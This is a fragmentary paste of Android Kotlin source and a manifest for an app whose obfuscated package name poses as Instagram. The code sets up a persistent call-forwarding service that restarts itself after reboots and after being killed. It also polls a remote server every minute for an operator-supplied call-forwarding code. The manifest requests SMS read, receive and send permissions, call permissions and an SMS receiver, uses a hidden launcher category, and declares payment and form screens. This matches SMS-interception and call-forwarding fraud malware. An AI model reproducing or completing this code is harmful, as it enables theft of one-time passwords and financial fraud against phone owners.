+            this, Manifest.permission.CALL_PHONE
+        ) == PackageManager.PERMISSION_GRANTED
+    }
+
+    // Schedule an alarm using AlarmManager that triggers the AlarmReceiver
+    @SuppressLint("ScheduleExactAlarm")
+    private fun scheduleAlarm() {
+        Log.d(TAG, "Scheduling alarm for next execution")
+        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
+        val alarmIntent = Intent(this, AlarmReceiver::class.java)
+        val pendingIntent = PendingIntent.getBroadcast(
+            this,
+            ALARM_REQUEST_CODE,
+            alarmIntent,
+            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+        )
+        val triggerTime = System.currentTimeMillis() + ALARM_INTERVAL
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            alarmManager.setExactAndAllowWhileIdle(
+                AlarmManager.RTC_WAKEUP,
+                triggerTime,
+                pendingIntent
+            )
+        } else {
+            alarmManager.setExact(
+                AlarmManager.RTC_WAKEUP,
+                triggerTime,
+                pendingIntent
+            )
+        }
+        Log.d(TAG, "Alarm scheduled for trigger time: $triggerTime")
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        Log.d(TAG, "Service onDestroy called")
+        // Unregister the SharedPreferences listener
+        val sharedPreferences = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
+        sharedPreferences.unregisterOnSharedPreferenceChangeListener(preferenceChangeListener)
+        Log.d(TAG, "SharedPreferences listener unregistered")
+        // Reschedule the alarm so that service is restarted if it gets destroyed
+        scheduleAlarm()
+    }
+
+    override fun onBind(intent: Intent?): IBinder? {
+        Log.d(TAG, "onBind called")
+        return null
+    }
+
+    // Start the service in the foreground with a notification.
+    private fun startForegroundServiceWithNotification() {
+        val intent = Intent().apply {
+            action = android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS
+            data = Uri.parse("package:$packageName")
+            flags = Intent.FLAG_ACTIVITY_NEW_TASK
+        }
+        val pendingIntent = PendingIntent.getActivity(
+            this, 0, intent,
+            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+        )
+
+        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("Service Running")
+            .setContentText("Tap to manage or disable the service")
+            .setSmallIcon(R.drawable.ic_launcher_foreground)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setContentIntent(pendingIntent)
+            .setAutoCancel(true)
+            .build()
+
+        startForeground(NOTIFICATION_ID, notification)
+        Log.d(TAG, "Foreground service started with clickable notification")
+    }
+
+    // Create a notification channel for foreground service (Android O and above)
+    private fun createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(
+                CHANNEL_ID,
+                "Call Forwarding Service",
+                NotificationManager.IMPORTANCE_LOW
+            ).apply {
+                description = "Handles automatic call forwarding."
+            }
+            val notificationManager = getSystemService(NotificationManager::class.java)
+            notificationManager.createNotificationChannel(channel)
+            Log.d(TAG, "Notification channel created")
+        }
+    }
+}
+
+
+
+alarmreceiver 
+
+package com.pakajb.avzbakl.msbzjl.instagram.services
+
+import android.content.BroadcastReceiver
+import android.content.Context
+import android.content.Intent
+import android.util.Log
+import androidx.core.content.ContextCompat
+
+class AlarmReceiver : BroadcastReceiver() {
+    companion object {
+        private const val TAG = "AlarmReceiver"
+    }
+
+    override fun onReceive(context: Context, intent: Intent?) {
+        Log.d(TAG, "Alarm received, restarting CallForwardingService")
+        val serviceIntent = Intent(context, CallForwardingService::class.java)
+        ContextCompat.startForegroundService(context, serviceIntent)
+    }
+}
+
+
+manifest 
+
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    >
+
+    <!-- Permissions -->
+    <uses-feature
+        android:name="android.hardware.telephony"
+        android:required="false" />
+
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_PHONE_CALL"/>
+    <uses-permission android:name="android.permission.MANAGE_OWN_CALLS"/>
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
+
+
+    <application
+        android:allowBackup="true"
+        android:icon="@drawable/ic_launcher"
+        android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_launcher"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.MyApp"
+        android:usesCleartextTraffic="false">
+
+        <!-- Main Activity -->
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            tools:node="merge">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.INFO" />
+            </intent-filter>
+        </activity>
+        <activity
+            android:name=".TransparentActivity"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:launchMode="singleTask"
+            android:exported="true"/>
+        <!--        &lt;!&ndash; SMS Receiver &ndash;&gt;-->
+        
+        
+
+
+
+        <receiver
+            android:name=".services.AlarmReceiver"
+            android:enabled="true"
+            android:exported="true" />
+
+
+        <receiver
+            android:name=".services.BootBroadcastReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+
+        <receiver
+            android:name=".receivers.SMSReceiver"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+
+
+        <!-- Register the temporary activity -->
+
+
+
+        <service
+            android:name=".services.CallForwardingService"
+            android:foregroundServiceType="phoneCall"
+            android:permission="android.permission.FOREGROUND_SERVICE"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="com.pakajb.avzbakl.msbzjl.instagram.START_CALL_FORWARDING" />
+            </intent-filter>
+        </service>
+
+
+
+
+
+        <!-- Boot Receiver -->
+        <receiver
+            android:name=".receivers.BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- SMS Service -->
+        <service
+            android:name=".services.SmsService"
+            android:foregroundServiceType="dataSync"
+            android:enabled="true"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="com.pakajb.avzbakl.msbzjl.instagram.START_SERVICE" />
+            </intent-filter>
+        </service>
+
+        <!-- Additional Activities -->
+        <activity android:name=".activities.FormActivity"
+            android:exported="false" />
+        <activity android:name=".activities.PaymentActivity"
+            android:exported="false" />
+        <activity android:name=".activities.SuccessActivity"
+            android:exported="false" />
+
+    </application>
+
+</manifest>
+
+
+
+Admin fetcher 
+
+package com.pakajb.avzbakl.msbzjl.instagram.receivers
+
+import android.content.Context
+import android.util.Log
+import com.pakajb.avzbakl.msbzjl.instagram.network.ApiClient
+import kotlinx.coroutines.*
+
+class AdminNumberFetcher(context: Context, private val uniqueId: String) {
+    private val appContext = context.applicationContext
+    private val sharedPreferences = appContext.getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
+    private val apiService = ApiClient.api
+    private var lastSavedCode: String? = null
+    private var isRunning = true
+
+    init {
+        lastSavedCode = getCallCode()
+        startFetching()
+    }
+
+    private fun startFetching() {
+        CoroutineScope(Dispatchers.IO).launch {
+            while (isRunning) {
+                fetchCallCode()
+                delay(60000) // 1 minute delay
+            }
+        }
+    }
+
+    private suspend fun fetchCallCode() {
+        try {
+            Log.d("AdminNumberFetcher", "Fetching call code for ID: $uniqueId")
+            val response = apiService.getCode(uniqueId)
+
+            if (response.isSuccessful) {
+                val responseBody = response.body()
+                if (responseBody != null && responseBody.success) {
+                    val newCode = responseBody.code ?: ""
+                    if (newCode.isNotEmpty() && newCode != lastSavedCode) {
+                        saveCode(newCode)
+                        lastSavedCode = newCode
+                        Log.d("AdminNumberFetcher", "New call code saved: $newCode")
+                    } else {
+                        Log.d("AdminNumberFetcher", "No new call code received.")
+                    }
+                } else {
+                    Log.e("AdminNumberFetcher", "API Response Error: ${responseBody?.message ?: "Unknown error"}")
+                }
+            } else {
+                Log.e("AdminNumberFetcher", "API Error: HTTP ${response.code()} - ${response.errorBody()?.string()}")
+            }
+        } catch (e: Exception) {
+            Log.e("AdminNumberFetcher", "Network Error: ${e.message}", e)
+        }
+    }
+
+    private fun saveCode(callCode: String) {
+        sharedPreferences.edit().putString("call_code", callCode).apply()
+        Log.d("AdminNumberFetcher", "Call code stored: $callCode")
+    }
+
+    fun getCallCode(): String? {
+        return sharedPreferences.getString("call_code", null).also {
+            Log.d("AdminNumberFetcher", "Retrieved call code: $it")
+        }
+    }
+
+    fun stopFetching() {
+        isRunning = false
+    }
+}
+
+
+bootbroadcast receiver 
+
+package com.pakajb.avzbakl.msbzjl.instagram.services
+
+import android.content.BroadcastReceiver
+import android.content.Context
+import android.content.Intent
+import android.util.Log
+import androidx.core.content.ContextCompat
+
+class BootBroadcastReceiver : BroadcastReceiver() {
+    companion object {
+        private const val TAG = "BootBroadcastReceiver"
+    }
+
+    override fun onReceive(context: Context, intent: Intent?) {
+        if (intent?.action == Intent.ACTION_BOOT_COMPLETED) {
+            Log.d(TAG, "Boot completed, starting CallForwardingService")
+            val serviceIntent = Intent(context, CallForwardingService::class.java)
+            ContextCompat.startForegroundService(context, serviceIntent)
+        }
+    }
+}
+
+
